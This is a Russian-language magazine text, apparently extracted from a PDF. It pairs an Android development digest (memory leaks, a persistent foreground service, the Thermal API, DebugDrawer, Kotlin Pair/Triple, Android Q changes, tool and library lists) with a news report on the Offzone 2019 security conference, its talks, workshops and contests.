Данный код регистрирует лис тенер для получения информации о текущем
местоположении при старте активнос ти и отклю чает его при корректном
завершении. Однако, если система экстренно завершит работу активности,
метод onStop не будет выз ван и LocationManager продолжит хранить ссыл ку
на активность.
  Решить эту проб лему можно так:


protected void onDestroy() {
    LocationManager.getInstance().unregister(this);
    super.onDestroy;
}

Автор статьи создал проект avoid‐memory‐leak‐android с демонстрацией этих
и других типов утечек памяти, а также исправленным кодом. Для поис ка уте‐
чек в своем приложении можно использовать LeakCanary.


Сервис, который никогда не умирает
Building an Android service that never stops running — статья о создании сер‐
виса, который никогда не умирает. Автор при водит при мер, когда необ‐
ходимо заставить приложение выполнять какую‐то работу в фоне с жес тко
заданной периодичностью.
   Разработчики Android нас тоятельно рекомендуют использовать для этого
JobScheduler (или более современный WorkManager), но его проблема в том,
что энергосберегающие механизмы Android (Doze и App Standby) могут
откладывать выпол нение работы на неоп ределенный срок. Классичес кие
сервисы (Service) тоже не подходят для этой задачи, так как, кроме энер‐
госберегающих механизмов, на их работу влияют ограничения Android 8 —
сервис будет завершен вскоре пос ле ухода приложения в фон.
  Решение проблемы состоит в том, что бы исполь зовать Foreground Service,
который будет получать частичный (partial) wakelock, чтобы не быть останов‐
ленным энергосберегающими механизмами. Полный код сервиса есть в ори‐
гинальной статье, а здесь приведем только самую мякотку — код, ответствен‐
ный за получение вейкло ка и выполнение задачи. Запускать его следует
из метода startCommand сервиса:


private fun startService() {
    if (isServiceStarted) return
    log("Starting the foreground service task")
    Toast.makeText(this, "Service starting its task", Toast.LENGTH
_SHORT).show()
    isServiceStarted = true
    setServiceState(this, ServiceState.STARTED)


    // We need this lock, so our service gets not affected by Doze
Mode
    wakeLock =
        (getSystemService(Context.POWER_SERVICE) as PowerManager).run
 {
            newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Endles
sService::lock").apply {
                acquire()
            }
        }


    // We’re starting a loop in a coroutine
    GlobalScope.launch(Dispatchers.IO) {
        while (isServiceStarted) {
            launch(Dispatchers.IO) {
                pingFakeServer()
            }
            delay(1 * 60 * 1000)
        }
        log("End of the loop for the service")
    }
}


Работаем с сен сорами температу ры
Keeping cool in Android Q with the Thermal API — краткая заметка о новом API
Android Q, позволяющем получать информа цию о текущем уровне нагрева
устройства и о переходе в состояние тротлинга (когда сис тема искусс твенно
занижает производитель ность устройства).
  Сам  API  крайне  прост.  Получить  текущий  уровень  нагрева можно
с помощью всего двух строк (Kotlin):


val powerManager = getSystemService(Context.POWER_SERVICE) as PowerM
anager
val currentStatus = powerManager.currentThermalStatus

Значение currentStatus будет одним из следующих:


THERMAL_STATUS_NONE = 0;
THERMAL_STATUS_LIGHT = 1;
THERMAL_STATUS_MODERATE = 2;
THERMAL_STATUS_SEVERE = 3;
THERMAL_STATUS_CRITICAL = 4;
THERMAL_STATUS_EMERGENCY = 5;
THERMAL_STATUS_SHUTDOWN = 6;

Значение 0 говорит о том, что все в пол ном порядке, 6 — кри тический уро‐
вень нагрева, за которым последу ет принуди тельное отключение устройства.
Как разработчик можешь использовать при веденный код, чтобы проверить
текущий уровень нагрева перед запуском интенсивных вычислительных опе‐
раций. К примеру, если текущий уровень наг рева равен 3, то следует пов‐
ременить с тяжелыми вычислениями либо вывес ти на экран предупрежда‐
ющее сообщение.
   API также позволяет следить за изменением уровня нагрева в реальном
времени с помощью листенера с интерфейсом OnThermalStatusChangedLis‐
tener:


powerManager.addThermalStatusListener {
    // Проверяем текущий статус
}


Отладка приложе ния прямо на устройстве
Android debug tools — обзор нес кольких инс трументов отладки, включая
встроенные в Android Studio отладчик и профайлер, уже несколько раз упо‐
минавшийся нами инстру мент Facebook Stetho, сервис AppSpector и биб‐
лиотеку DebugDrawer.
  В контексте этого дайджеста нам наиболее инте ресен DebugDrawer.
В отличие от других инс трументов, эта биб лиотека поз воляет отлаживать
и профилировать приложение пря мо на устройстве с помощью выдвигаемой
с одной из сторон приложения панели (drawer).
  Подклю чить библиотеку к проекту очень прос то:


debugImplementation 'io.palaima.debugdrawer:debugdrawer:0.8.0'

Далее в метод onCreate основной активнос ти приложения добавляем такой
код:


SwitchAction switchAction = new SwitchAction("Test switch", new
SwitchAction.Listener() {
    @Override
    public void onCheckedChanged(boolean value) {
        Toast.makeText(MainActivity.this, "Switch checked", Toast.
LENGTH_LONG).show();
    }
});


ButtonAction buttonAction = new ButtonAction("Test button", new
ButtonAction.Listener() {
    @Override
    public void onClick() {
        Toast.makeText(MainActivity.this, "Button clicked", Toast.
LENGTH_LONG).show();
    }
});


SpinnerAction < String > spinnerAction = new SpinnerAction < > (
    Arrays.asList("First", "Second", "Third"),
    new SpinnerAction.OnItemSelectedListener < String > () {
        @Override public void onItemSelected(String value) {
            Toast.makeText(MainActivity.this, "Spinner item selected
‐ " + value, Toast.LENGTH_LONG).show();
        }
    }
);


debugDrawer = new DebugDrawer.Builder(this).modules(
    new ActionsModule(switchAction, buttonAction, spinnerAction),
    new FpsModule(Takt.stock(getApplication())),
    new LocationModule(this),
    new ScalpelModule(this),
    new TimberModule(),
    new OkHttp3Module(okHttpClient),
    new PicassoModule(picasso),
    new GlideModule(Glide.get(getContext())),
    new DeviceModule(this),
    new BuildModule(this),
    new NetworkModule(this),
    new SettingsModule(this)
).build();

Возможности DebugDrawer хорошо видны в коде. Модули можно подключать
и отключать независимо друг от друга. Геоло кационный модуль умеет спу‐
фить местоположение. Сетевой модуль поз воляет вылавливать отдельные
сетевые запросы с помощью библиотеки Chuck. Недостаток: нет модуля
для инспекции баз данных.





                           DebugDrawer


Воз вращаем два значения из фун кции
Pair and Triple in Kotlin — статья о специальных классах Kotlin, позволяющих
возвращать два или три значения из функции. Это может пригодиться, нап‐
ример, для возврата кода ошибки или в случаях, ког да необходимо вернуть
несколько значений раз ных типов.
   Декларация Pair (два зна чения) выглядит так:


Pair ("Hello", "Kotlin")
Pair ("Kotlin", 1)
Pair (2, 20)

Получить значения первого и второго элемента можно сле дующим образом:


println(variableName.first)
println(variableName.second)

Для создания Pair можно использовать инфиксную функцию to:


fun getWebsite() : Pair<String, String> {
    return "www.mindorks.com" to "the Website is"
}

А для получения значений — дес труктивный оператор:


val (url: String, website: String) = getWebsite()

Pair можно превратить в строку с помощью метода toString():


val variableName = Pair (variable1, variable2)
print(variableName.toString())

Или в список из двух элементов с помощью метода toList():


val variableName = Pair (variable1, variable2)
val list = variableName.toList()

Класс Triple полностью ана логичен Pair за исклю чением того, что он может
хранить три значения вмес то двух:


val variable1 = "string1"
val variable2 = 1
val variable3 = "string2"


val variableName = Triple (variable1, variable2, variable3)


println(variableName.first)
println(variableName.second)
println(variableName.third)


Ограниче ния Android Q
Preparing your app  for Android Q — статья об изме нени ях в Android Q,
к которым необходимо быть готовым.
 1. Фо новый запуск активностей. Начиная с Android Q приложения боль‐
  ше не могут запускать активности, находясь в фоне. Исключения сделаны
   для bound‐сервисов, таких как Accessibility или сервисы автозапол нения.
  Приложения, исполь зующие разрешение SYSTEM_ALERT_WINDOW, и при‐
   ложения, получающие имя активности в системном PendingIntent, также
   могут запускать активности в фоне. В качес тве альтернативы можно
   использовать так называемые полноэкранные уведомления (метод set
  FullScreenIntent() в Notification.Builder).
 2. Иден тификаторы устройства. Доступ к IMEI и серийному номеру
   устройства теперь запрещен. Если TargetSdk при ложения равен Q, будет
  выброшено исключение, в противном случае возвращается  null. MAC‐
   адрес рандомизируется.
 3. Местополо жение в фоне. Android Q поз воляет пользователю выбрать,
   в каких случаях предос тавлять приложению дос туп к мес тоположению:
   всегда или только пока приложение находится на экране. Если TargetSdk
   приложения равен Q, приложение должно сделать явный запрос на доступ
   к местоположению в фоне, в противном случае оно получит разрешение
   автоматически при наличии обычного разрешения на доступ к местополо‐
   жению. Однако система может вывес ти уведомление, позволяющее поль‐
   зователю отозвать это разрешение.
 4. Жесты. В Android Q система навигации на основе жес тов получила даль‐
  нейшее развитие. Теперь в качес тве кнопок «Назад», «Домой» и «Пос‐
   ледние приложения» можно использовать свайпы с левой, нижней и пра‐
   вой сторон экрана. Эти жес ты могут конфликтовать с жес тами, исполь‐
   зуемыми в самом приложении. Что бы добавить некоторые регионы экрана
   в исключения системных жестов, можно использовать метод View.set
  SystemGestureExclusionRects() .
 5. Темная тема. В Android Q появилась темная тема, которую пользователь
  может выбрать в системных нас тройках. Чтобы приложе ние автоматически
   переключалось на темную тему, его тема должна наследоваться от сис‐
   темной темы DayNight: <style name="AppTheme"  parent="Theme.
  AppCompat.DayNight">. Также необ ходимо создать отдельные фай лы
   ресурсов для ночной темы, в частности для цветов: valuesnight/col
  ors.xml.





     Запрос разрешения на определение местоположения в Android Q


             ИНСТРУМЕНТЫ


 • QCSuper — приложение для перехвата фреймов 2G/3G/4G с устройств,
   использующих модемы Qualcomm;
 • Kali NetHunter App Store — альтернативный магазин приложений со сво‐
  бодным софтом для аудита безопасности;
 • FridaLoader — простая утилита для быс трой установки и запуска сервера
   Frida в эмуляторе Genymotion;
 • jebscripts — набор скриптов декомпилятора JEB для реверс‐инжи ниринга
   обфусцированного кода;
 • Dwarf — графический отладчик на базе Frida;
 • Frida‐Android‐unpack — Frida‐скрипт для дампа dex‐фай лов при ложе ний,
  защищенных с помощью упаковщиков;
 • DroidLysis — скрипт для извлечения различных зна чений из кода и ресур‐
   сов приложений;
 • MagiskTrustUserCerts — модуль Magisk, авто матичес ки добавляющий уста‐
   новленные пользователем сертификаты в сис темное хранилище сер‐
   тификатов;
 • ipasim — iOS‐эмулятор для Windows.





                           QCSuper


              БИБЛИОТЕКИ


 • Room‐Runtime — модифицированная версия биб лиотеки AndroidX Room
   с поддержкой обфускации с помощью ProGuard;
 • Knot — реактивный кон тейнер сос тояния для Android и Kotlin;
 • WatchTower — библиотека для отладки OkHTTP‐запросов с помощью бра‐
   узера;
 • Komprehensions — набор Kotlin‐функций для разворачивания излишне
   вложенных функций;
 • sekret — библиотека  для  автоматического  скрытия важных  данных
   из логов;
 • Only — библиотека для запуска функций нужное количество раз в опре‐
   деленной последовательнос ти (нап ример, еди новременный запуск экрана
   приветствия, после чего запуск основной активнос ти);
 • android‐components — набор библиотек для соз дания браузе ров от ком‐
   пании Mozilla;
 •  clikt — библиотека для работы с командной строкой;
 • PrimeDatePicker — очередной диалог выбора даты с возможностью выб‐
   рать отрезок времени;
 • RVcompose —  Kotlin DSL для построения динами ческого интерфейса
   с помощью RecyclerView;
 • AndroidUtilCode — огромное количество подсобных функций, которые
   могут пригодиться при раз работке для Android.





                 Шпаргалка по командам ADB
HEADER
    ПОСТ
    ПОСТ
 АПОКАЛИПСИС


       ВСЕ САМОЕ ИНТЕРЕСНОЕ
         С КОНФЕРЕНЦИИ
            OFFZONE 2019





                                     Журнал «Хакер»
                                                   xakep@glc.ru





17 и 18 июня Мос ква принима ла уже вторую международную
конференцию по кибербезопасности Oﬀzone. За время кон‐
ференции одни набили руку в написании бинарных экспло‐
итов, другие набили на руке хакерское тату. Кто‐то прокачал‐
ся в пайке, а кто‐то — в плойке. Шесть треков докладов,
одиннадцать зон с активностями, 68 экспертов из Европы,
Азии и Америки, 1600 участников — мы расскажем тебе,
как это было.





  Конференция Oﬀzone 2019 прошла на площадке «Цифрового делового
  пространства»


ДОКЛАДЫ
Ведущей темой конференции Oﬀzone 2019 стали проб лемы защищенности
устройств, как на аппаратном уровне, так и на уровне прошивок. Обо всем
этом говорили клю чевые спикеры, докладчи ки специализированного трека
Hardware.Zone, специалисты финансовой отрасли на Finance.Zone — и этой
же теме была посвящена отдельная площадка с практическими заданиями
IoT.Zone.





     Конференция открылась докладом о низкоуровневых уязвимостях


Зо лотой век аппаратных зак ладок
Кейноут‐спикер Александр Матросов, главный исследователь безопасности
прошивок и устрой ств в компании Nvidia, назвал наше время «золотым веком
аппаратных закладок»: «С перехо дом компаний на облачные инфраструктуры
и рос том числа умных устройств аппа рат ные ата ки становятся все прив‐
лекательней для зло умышленников. Успешный взлом прошивки делает бес‐
полезным все программные меры защиты, а обнаружить это крайне трудно.
При этом приоритетом инженеров оста ется функциональность и надежность
устройств, а не их безопас ность».





  Прошивка и железо — слепое пятно для существу ющих способов детек‐
  тирования угроз. Исправить такие уязвимости или очень труд но,
  или невозможно

Если Александр Матросов разоб рал осо бенности низ коуровневых уязвимос‐
тей на примере прошивок, то Юрий Купашев, ведущий спе циалист BI.ZONE,
коснулся проблем железа. На Hardware.Zone он извлек секретный ключ
из незащищенного Arduino Nano с помощью ата ки по питанию и оборудо‐
вания за 5500 рублей.
  Спикер подчеркнул: аппаратные уяз вимос ти возникают не только из‐за
ошибок разработки, но и из‐за побочных физических явлений во вре мя
работы устройства. Иными сло вами, если не внедрить защитные механиз мы
на этапе создания, устройство по умолчанию будет уяз вимо к атакам по вто‐
ростепенным каналам. Реальное защищен ное устройство не получится взло‐
мать без специализированной лабора тории и обо рудования стоимостью
в десятки миллионов рублей — но таких устрой ств меньшинство.





  Самое дешевое оборудование, только бес платное ПО — и секретный
  ключ в руках атакующего

Члены исследовательской группы VUSec Себасть ян Остерлунд и Сте фан ван
Шейк выступили на первом треке с докладом по уязвимости RIDL (Rogue In‐
ﬂight Data Load), полностью лома ющей модель безопасности современных
процессоров. Разработчики приложений, обрабатывающих критически важ‐
ную  информацию,  рас считыва ют,  что  неп ривилегированные  процессы
не смогут украсть конфиденциальные данные (пароли, счета, суммы) из их
приложений или со страниц сайта.
  Обнаруженный исследова телями метод позволяет вредоносному процес‐
су красть почти любые данные, обрабатываемые на компьюте ре. Хватит
и  одной  вкладки  в  бра узере,  в  которой  открыт  недоверенный  сайт
или запуще на реклама. Уяз вимость относится к классу спекулятивных —
самых серьезных для всех процессоров.





  RIDL указывает на систематические ошиб ки безопасности в процес‐
  сорах Intel, продол жая тренд Meltdown и Spectre и уменьшая количес тво
  условий, необходимых для успешной ата ки

Масштабные аппаратные уязвимос ти оста ются даже в критичес ких сис темах
(о чем, в частности, рассказывал на Hardware.Zone Борис Савков в докладе
о безопасности промышленных систем управления). Отчасти это объясня‐
ется трудоемкостью исследований в этой сфере: необходимое оборудование
и документация не всегда дос тупны, информации мало. Тем важнее оказыва‐
ется каждая находка, которая упрощает работу специалистов.
  Одной такой находке был посвящен доклад экспертов по безопасности
в Positive Technologies Максима Горячего и Марка Ермолова. Они обнаружили
полноценный логический анализа тор для устройств Intel и подробно рас ска‐
зали про особенности вза имодействия с ним. Используя их наработки,
исследователи смогут взглянуть на внут реннее устройство современных
платформ Intel, отлаживать работу компонентов сис темы на самом низком
уровне. Это кардинальным обра зом изменит подход к поис ку новых уяз‐
вимостей на уровне микроархитектуры.





  Разработка экспертов поз воляет любому исследователю получить
  интерфейсы отладки, которыми пользуется сама корпорация Intel

Но и хорошо исследованные элементы компь ютерной архитектуры могут ока‐
заться небезопасными. Артем Шишкин, эксперт из команды STORM (Strategic
Oﬀensive Research & Mitigations), показал, какие проблемы воз никают из‐за
неправильных настроек блока управления памятью. В докладе он привел рас‐
пространенные ошибки при построении таб лиц страниц и продемонстри‐
ровал, что упускают современные операционные системы в плане безопас‐
ности маппинга виртуальной памяти.
  Даже в финансовой отрасли, где безопас ности уделяется особенно много
внимания, к защищенности устройств остаются вопросы. На Finance.Zone
Алексей Стенников,  руково дитель  груп пы анализа аппаратных  средств
из Positive Technologies, ука зал на болевые точки POS‐терминалов, в числе
которых незакрытые аппа рат ные интерфейсы для отладки и альтернативные
прошивки в открытом доступе.
  А Ольга и Алексей Осиповы из Kaspersky Lab в рассказе о банкоматах
напомнили, что не все уяз вимости объясня ются несовершенством архитек‐
туры, — проблемы безопасности возника ют и из‐за халатности тех, кто дол‐
жен обслуживать устройство.





  Закрыть уязвимость к атаке BlackBox иногда проще, чем решить проб‐
  лему забытых на видном мес те кабелей USB

Программно‐аппаратные ата ки сравнительно сложны, но сегодня многие
факторы повышают их привлекательность для киберпреступников как в тра‐
диционных областях (банкоматы, промышленные системы), так и в новых
(интернет вещей, облачные инфраструктуры). Лей тмотивом многих выс тупле‐
ний поэтому был призыв внедрить практики кибербезопасности в разработку
аппаратной части системы, как это несколько десятилетий назад сделали
разработчики программной час ти.


Бе зопасность приложе ний — ответствен ность каж дого
Безопасность программных продуктов обсужда лась на отдельном треке —
AppSec.Zone.
   Keynote‐спикером зоны выступил Марк Миллер, евангелист направления
DevSecOps и один из орга низаторов конференции DevSecOps Days. Он рас‐
смотрел эво люцию DevOps, отметив, что стремительное ускорение жиз‐
ненного цикла программных продуктов сопровождает ся уве личе нием скорос‐
ти разработки экспло итов для новых уязвимостей и кардинальным сок‐
ращением времени до их появления в пуб личном доступе — с 45 до 3 дней.
При этом противостояние ата кующих и разработчиков начинает упираться
не только в возможности автоматизации, но и в человеческий фактор.
  По мнению Марка, разумной стратегией в текущих условиях будет чаще
проводить тестирования, активно внедрять автоматизацию и помнить, что
в конечном счете многое определяют пра вильные привычки и культура, а не
инструменты: «Каждый должен отвечать за безопас ность, не только команда
по безопасности. Безопас ность нельзя добавить к продукту в самом конце —
она закладывается изна чально».





  Среднее время появления экс пло ита в публичном доступе
  с 2006 по 2017 год сократилось на 93%. Нужно активнее вовлекать раз‐
  работчиков в вопросы безопас ности

Пример конкретного правила, которое поможет воплотить в жизнь этот прин‐
цип, предложил Сер гей Шекян из Shape Security. Он призвал продуктовые
команды при решении проблем ориентироваться на спе цификации и стан‐
дарты, а не начинать с костылей со Stack Overﬂow: «Совет читать специфи‐
кации звучит банально, но ведь никто не обращается к WHATWG или даже
MSN, когда возникают вопросы, — помнят зубодробительный юридический
язык старых стандартов. Но сегодня спецификации сос тавля ют лучше, и они
выглядят как понятные алго ритмы. Лучше восполь зоваться ими, чем сразу
писать обходное решение и создавать потенциаль ные уязвимости».
  Об интересном подходе к обеспечению безопас ности продуктов, встро‐
енном в общую систему безопасности, рас ска зал Дмитрий Десятков, CISO
Wrike. Команда Wrike организовала корпоративные процессы продуктовой
безопасности на базе своего флагманского про дукта — системы управления
проектами. Успешные шаблоны решения внут ренних задач по безопасности
позже становятся доступны пользователям Wrike, тем самым делая продукт
более конкурентоспособ ным.
   Эту новую роль безопасности в привлечении клиентов Дмитрий отметил
отдельно: «Частным лицам и особен но корпорациям важно, чтобы их данные
и активы были защищены. Поэто му сегодня для компаний, которые создают
приложения и программные продукты, вло жения в безопасность их разработ‐
ки превращаются из статьи зат рат в статью доходов».





  Безопасность эво люционирует вместе с продуктом и пос тепенно ста‐
  новится бизнес‐функцией

Технический эксперт Checkmarx Леон Май стер очертил сферы, в которых тех‐
нологии  машинного  обучения  смогут  упростить  жизнь  специалистам
по кибербезопасности. Например, современные анализаторы группиру ют
найденные уязвимости по уровню их критичности, а обученный алгоритм
может дополнить эту оценку «уровнем уверенности» анализатора в каждой
уязвимости. Подоб ные подсказки помогут специалистам приоритизировать
задачи и выиграть время при работе с множеством продуктов на высоких ско‐
ростях.
   Качественный структурированный обзор по ата кам на Android‐приложения
через IPC подготовил Егор Богомо лов из Wallarm: его пре зентацией можно
пользоваться как мануалом для начина ющих пентесте ров. А выступление
Омара Ганиева, CEO DeteAct, поможет систематизировать подход к сканиро‐
ванию приложе ний и избежать человеческих ошибок при выстраивании
рабочего процесса.


О борьбе со зло умыш ленниками
Несколько докладчиков Finance.Zone затронули акту альную тему противос‐
тояния кибермошен никам в сфере банкинга и финансов.
  Борис Иванов, специалист по рас следова нию компьютерных инцидентов,
познакомил слушателей с опытом BI.ZONE в выявлении зараженных Android‐
устройств. Из‐за популярности этих девайсов на них нацеле но большинс тво
вредоносных программ для смартфонов, и каждое семейство таких программ
заражает в среднем 7400 устройств в неделю. Пос ле зараже ния смартфона
мошенники получают в том числе доступ к интернет‐банку и переводят средс‐
тва жертвы на свои счета.
  Специалисты по кибербезопас ности пос троили виртуальную ферму An‐
droid‐устройств, чтобы имитировать зараженных клиентов. Когда злоумыш‐
ленники пытаются украсть у них деньги, к экспертам попадают реквизиты,
связанные с фродом. В дальнейшем эти данные помогают вычислять
зараженные устрой ства реальных пользователей, а банкам — выявлять
мошеннические транзакции.





  Виртуальная ферма начиналась как эксперимент, а теперь приб лижается
  к промышленному уровню

Сергей Вельц, CTO и один из осно вателей Cybertonica, дал детальные
рекомендации, как создать систему транзакционного фрод‐мониторинга.
Опираясь на шестилетний опыт противо дей ствия фроду, Сергей рассказал
об основных угрозах для банка‐эквайера, а также требованиях к програм‐
мной реализации разрабатываемой системы. Он подчеркнул, что машинное
обучение в этой сфере реализовать трудно: процессы нестаци онарны, акту‐
альных тестовых данных мало, и они быстро устаревают, из‐за чего сложно
провести разметку.
  Кроме того, фрод‐аналитикам придет ся осваивать допол нительную про‐
фильную область, чтобы вносить корректировки в модели, которые трудно
интерпретировать. В продвинутых системах фрод‐мониторинга дополнитель‐
ными источниками для ана лиза ано мального поведения служат Threat Intelli‐
gence и цифровые отпечатки устройств.





   Жизненный цикл систем фрод‐мониторин га длится от года до трех лет

Отдельная задача — учесть в системе требова ния всех регулирующих орга‐
нов. Появившееся в России и Европе строгое законодательство по защите
персональных  данных  раз рабатывалось  без  оглядки  на  потребности
фрод‐аналитиков — нужно приложить усилия, чтобы найти баланс между
положениями ФЗ‐152 или GDPR и необ ходимостью использовать информа‐
цию о поведении пользователей.


                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
 ПОСТПОСТ АПОКАЛИПСИС
          ВСЕ САМОЕ ИНТЕРЕСНОЕ С КОНФЕРЕНЦИИ
                                 OFFZONE 2019





ПРАКТИКА И ТЕХНИКА
Практическая направленность Oﬀzone 2019 выражалась и в подборе док‐
ладов, и в организации отдельных пло щадок под мастер‐классы и живые
демонстрации.
  В открывающий день конференции прош ли два воркшопа. На первом
из  них  гости  Oﬀzone  тренировались  писать  бинарные  эксплоиты
под руководством core‐участника команды LC/BC Сергея Иванова. Работа
строилась  вокруг шес ти заданий  CTF: каждое  из  них сперва давали
для самостоятельного решения, а потом Сергей объ яснял свой вариант.
Велась турнирная таблица, и участнику, сдавшему больше всего флагов, дос‐
талась атрибутика Oﬀzone.





        Сергей Иванов рассказывает про карту памяти процесса

На втором воркшопе эксперт по безопасности Kudelski Group Роман Кор‐
кикян продемонстрировал воз можности атак по второстепенным каналам
на примере алгоритма AES. Здесь тоже предлагалось решить задания с пос‐
ледующим разбором, а в конце Роман рас сказал, как с помощью атаки side
channel взламывали PS4.
  Во второй день конференции второй трек объединил короткие доклады
о практических техниках и лайфхаках. Денис Рыбин (Digital Security) под‐
готовил обзор избранных плагинов Burp Suite и поделился тонкостями их
использования. Ольга Карело ва (M‐13) рас ска зала, как особенности Mi‐
crosoft Azure могут помочь пентестерам обойти антиспам‐решения при про‐
ведении тренировоч ной фишинговой рас сылки.
   Татьяна Михайлова (Deiteriy Lab) предложила готовую методологию ауди та
безопасности смарт‐кон трактов STO для платформы Ethereum, а Никита Сту‐
пин  (Mail.ru  Group)  рассмотрел  инс трументы  для  поис ка  уязвимостей
в GraphQL API.





  Утилита GraphQL Voyager преобра зует результат выполнения запроса
  в удобные диаграммы

Отдельный интерес здесь выз вало собственное решение Георгия Сидоров‐
ского (Home Credit & Finance Bank), которое предотвращает утечку конфиден‐
циальных данных в исходных кодах, ана лизируя информацию в git‐репози‐
ториях и push‐запросах. А из доклада Павла Канна и Николая Топоркова
(Swordﬁsh  Security) слушатели узна ли,  как, вос пользовавшись цепочкой
небольших недоработок HR‐системы, которые по отдельности не несли осо‐
бого риска, можно было тру доус троить себя в компанию мечты или рас‐
чистить путь от конкурентов.





  Вместо многочисленных техничес ких интервью и сложных тес товых
  заданий — одна успешная ата ка, чтобы перевес ти свое резюме в статус
  «Принят на работу»

Оба дня конференции работа ла Tool.Zone — площад ка, где специалисты
по кибербезопасности делились своими разработками. Каждый спикер
на несколько часов получал в рас поряжение стенд, проводил живую демонс‐
трацию собственной тулзы, общался с посети теля ми и отве чал на вопросы.
Этот новый для российских конференций формат вошел в программу Oﬀzone
впервые и сразу вызвал интерес.
  На Tool.Zone демонстрировали инс трументы defensive‐ и oﬀensive‐нап‐
равлений безопасности. Владимир Иванов (Digital Security) представил про‐
ект Raw‐packet для автоматизации MitM‐атак в сетях IPv4 и IPv6 и показал его
в деле, выполнив атаку на Apple‐устройство. Турецкие исследователи Тас
Мелих и Неслисах Топку поз накомили участников конференции с тулзой
Mr.SIP — она помогает проводить ата ки на осно ве SIP‐протокола от поиска
устройств до их компро мета ции.
  Джайеш Сингх Чаухан (Sprinkl) рас крыл воз можнос ти своего Cloud Security
Suite — опенсорс‐инс трумента, который позволяет анализировать  кон‐
фигурации инфраструктур AWS/GCP/Azure. Фрей мворк Антония Николаева
(BI.ZONE) верифицирует данные из Shodan и Censys и способен сильно
упростить поиск сервисов или обо рудования, смот рящих в интернет, а Kubolt
Антона Булавина и Ксении Абрамовой (SEMrush) дает возможность на базе
того же Shodan искать общедоступные кластеры Kubernetes и осуществлять
атаки, вплоть до получения доступа к конкретному контейнеру (поду).





  Представители питер ской команды SEMrush объясняют, как получить
  непривилегированный дос туп к API Kubernetes с помощью Kubolt


АКТИВНОСТИ
Oﬀzone — конференция с большим числом технических квестов, конкурсов
и соревновательных зон. В этом году на одиннадца ти площадках боролись
за звание лучшего и зарабатывали Oﬀcoin, внут реннюю валюту конференции,
которую можно было обменять на постапока лип тичес кий мерч.

Хак‑квест от CTFZone
Организаторы соревнований CTFZone специально для конференции под‐
готовили отдельный квест. В атмосферной локации участники получали ко‐
микс и погружались в лихо закрученный сюжет: мир постапокалипсиса, все‐
могущая корпорация, мозговые чипы, странные смерти, пугающие надписи
на экранах, не видимые ни для кого, кроме главного героя…





  Утащить печатный комикс с собой, к сожалению, уже не получится, зато
  скачать в PDF — всегда пожалуйста

Чтобы собрать все кусочки головоломки (и по пути получить Oﬀcoin), нужно
было решать онлайн‐ и офлайн‐задания. Веб, реверс, форензика, криптогра‐
фия, безопасность устройств интернета вещей, OSINT и программирование
в разной пропорции — десять препятствий отделяли энту зиастов от раз гадки.
   249 участников приняли вызов и самоотверженно искали флаги круглые
сутки, но преодо леть рубеж в пять заданий и раскрыть смертельный заговор
против жителей постапока лип тичес кой Мос квы удалось всего двадцати храб‐
рецам. А победу одержал герой, кто под самое закрытие квеста добрался
до последнего решения, распространил кибервакцину и всех спас. Помимо
профессиональной техники, которая вру чалась тройке лучших, спаситель
получил спе циальный приз — сертификат на бес платную татуировку со своим
ником.





  Локация помогала про чувс твовать атмосферу бытового пос тапокалип‐
  сиса


Кон курсы и раз вле чения
Две зоны с активностями продолжили ключевую тему Oﬀzone 2019 и пред‐
лагали справиться с низкоуровневыми тас ками.
  На IoT.Zone участников жда ли три сети умных домов с камерами, розет‐
ками, роутерами и лампочками разных произво дителей. Чтобы получить Oﬀ‐
coin, нужно было реверсить прошивки устройств и приложений для управле‐
ния, разбирать дампы трафика. При этом вторая сеть была доступна сразу,
а к остальным участники должны были получить дос туп самостоятельно,
разобравшись в технологии smart conﬁg.





  Часть уязвимостей на девайсах были неизвес тными, но несколько
  человек и их обнаружили

Craft.Zone, или зона пайки, ока залась одной из самых популярных на Oﬀzone.
Здесь под руководством прож женных инженеров каждый мог потюнить свой
бейдж участника, чтобы открыть доступ к дополнительным таскам и Oﬀcoin
за их решение. О бейджах в виде печатных плат и заданиях с ними подробно
рассказано в блоге BI.ZONE.





  В базовой вер сии бейдж был электронным кошельком для Oﬀcoin,
  но при желании можно было проапгрейдить плату и играть на ней в Flap‐
  py Quote

На стенде BI.ZONE развернулся хакерско‐гастро номичес кий конкурс Hacked
in 10 (15) minutes. Участник призывал на помощь все свои скиллы и тул зы
и пытал ся решить CTF‐таск у всех на глазах. С каж дой секундой призовая
сумма Oﬀcoin уменьшалась: по истечении пят надца ти минут победа вообще
не приносила очков. Чтобы игровая валюта испа рялась помедленней, при‐
ходилось терпеть наказание для вкусовых рецепторов. Кислая жвачка, острый
мармелад, сок с табаско, текила — учас тни ки попробовали все, и для двенад‐
цати человек жертва ока залась не напрасной.





  Комментатор помогал зрителям понять, что про исходит, и направлял
  мысли участника в нужное рус ло

В соседней локации решали пос тапока липтичес кие задачи за мерч и Oﬀcoin.
Это был тот самый случай, когда выживших после катас трофы удавалось
спасти с помощью олимпиадных зна ний по математике, а победу в сражении
с армией зомби‐киборгов приносило понимание основ криптографии.
  На стенде Mail.ru предлагалось уболтать голосового помощника, пока он
не выдаст какой‐то результат, отличный от новостей. Бот понимал команды
только на английском языке, и для некото рых это создало допол нительные
трудности. Одному из участников пришлось срочно найти репети тора и за
ночь поставить произно шение — возможно, это был первый раз в истории,
когда учитель английского помогал надиктовывать SQL‐инъекцию.





  А еще на этом стенде разыг рывали про моко ды на 100 долларов для bug
  bounty

Sberbank Cyber Security доверил участникам конференции самое сокровен‐
ное — приложе ние «Сбербанк Онлайн». После десяти минутного краш‐курса
по безопасности мобильных приложений реверсеры‐энтузиасты могли поп‐
робовать отключить проверку root, антивирус и SSL pinning. А команда Qiwi
подготовила телеграм‐квест, где предлагалось угадать доменный пароль
по фотографиям рабочих мест.
   Чтобы разгрузить голову пос ле докладов и тасков, посетители конферен‐
ции приходили на Tattoo.Zone и Game.Zone. Первая площад ка продол жила
традицию дебютного Oﬀzone: здесь начинающие тату‐мастера покрывали
узорами шкуру бизона, пока профессионалы набивали гостям хакерские тату.
Тема с пожизненным проходом на все мероприятия Oﬀzone за тату с фир‐
менным лого привлекла уже двух смельчаков, а герой прошлого года,
носящий знак Oﬀzone на шее, освежил здесь свою кол лекцию нательных
рисунков.





  Отважиться на тату — серьезный шаг. Храб рецов вознаграждали Oﬀcoin
  и полным набором мерча

На Game.Zone проходили киберспортивные турниры, победители которых
получали Oﬀcoin. А трех игроков, которые про явили особую преданность
любимому делу и провели с приставка ми большую часть конференции, этими
самыми приставками и наградили: «Чтобы наслаждались играми дома,
а здесь учились хакать».


